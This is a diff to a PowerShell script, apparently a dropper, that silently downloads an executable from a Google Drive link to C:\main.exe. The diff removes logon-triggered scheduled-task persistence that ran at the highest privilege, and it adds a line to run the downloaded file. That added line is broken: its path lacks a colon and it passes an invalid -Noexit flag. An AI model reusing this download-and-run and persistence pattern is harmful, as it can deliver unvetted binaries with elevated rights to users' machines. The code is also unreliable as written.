@@ -19,8 +19,5 @@ $source = 'https://drive.google.com/u/8/uc?id=1sVWGSv0z0kxDindHruAM6P6alLBiz6ad&
 $ProgressPreference = 'SilentlyContinue'
 $destination = 'C:\main.exe'
 Invoke-RestMethod -Uri $source -OutFile $destination
-$ac = New-ScheduledTaskAction -Execute "C:\start.bat" 
-Invoke-RestMethod -Uri $source -OutFile $destination
-$tr = New-ScheduledTaskTrigger -AtLogOn 
-Register-ScheduledTask StartAtUserLogin -Action $ac -Trigger $tr -Description "Schedule Task at User Login" -RunLevel Highest 
+Start-Process -FilePath "C\main.exe" -Noexit
 Write-Output "Pobrane"
